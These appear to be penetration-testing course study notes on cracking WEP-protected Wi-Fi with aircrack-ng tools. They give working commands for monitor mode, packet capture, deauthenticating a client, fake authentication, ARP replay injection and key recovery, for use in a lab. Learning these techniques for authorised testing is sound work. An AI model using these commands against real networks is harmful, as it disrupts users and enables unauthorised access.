# Attacking WEP

### WEP (Wired Equivalent Privacy)

`airmon-ng start wlan0` - Put your wireless interface into monitor mode. `airodump-ng -c <channel> -w wep_attack <interface>` - save to a file with "-w", lock to a single channel with "-c". This cmd starts scanning/sniffing.

Read from page 19, in the eCPPTV2 pdf - Attacking Wifi Networks.

For WEP cracking, the "#Data" and "#/s" columns are very important to note. We want to make sure we have high values for these columns in order to succeed. If the value in the "#Data" column is low, we need a way to increment the packet rate!

1. We will use the "Deauth attack", after a deauth, victim send some gratuitous ARP or DHCP messages and this is clearly valuable as it is sent encrypted.&#x20;

`aireplay-ng -0 10 -c <client_mac> -a <BSSID_or_AP_mac_addr> wlan0mon` - sends 10 deauth to victim. By now, the "#Data" column value should be increased.

2. Another method is "ARP replay attack" APR replay is the most effective way to generate new IVs. Once you sniff an ARP request generated by a STA, you can re-inject that packet due to WEP's lack of message replay countermeasures. As it is a broadcast message, the AP will forward the request to the associated STAs and each of these requests will contain a new IV for you to collect. Read from page 30 on the pdf.

* To perform ARP replay, we first need to be associated to the AP.

#### Step 1

&#x20;`aireplay-ng -1 15 -a <bssid_of_AP> -e <ssid_of_AP> wlan0mon` - `-1` stands for fake authentication, while `15` is the delay between authentication attempts. or use: `aireplay-ng -1 6000 -q 10 -o 1 -a <bssid> -e <ssid> wlan0mon` - "-q 10" is to enable keep-alive packets (sends packets every 10secs to maintain the authentication status), "-o 1" forces aireplay-ng to send one set of packets at a time, these can be necessary as some APs can get confused. Note: do not close the previously opened terminal window.

#### Step 2

Now we need to listen for ARP requests sent by clients on the network. `aireplay-ng -3 -b <bssid> <intf>` -

#### Step 3

After a few minutes, you should capture at least an ARP request. In your lab environment, yo can generate one by pinging a nonexistent ip from your victim client.

#### Step 4

Almost instantly aireplay-ng will start to re-inject the captured ARP request.

#### Step 5

Airodump-ng will show the increase in received data frame as you are flooding the AP. Without closing the windows, now to the last phase of the attack.

### Cracking the Password with \[aircrack-ng] utility

`aircrack-ng -n <key_length> <.cap_file>`

Read from page 51 on the pdf.





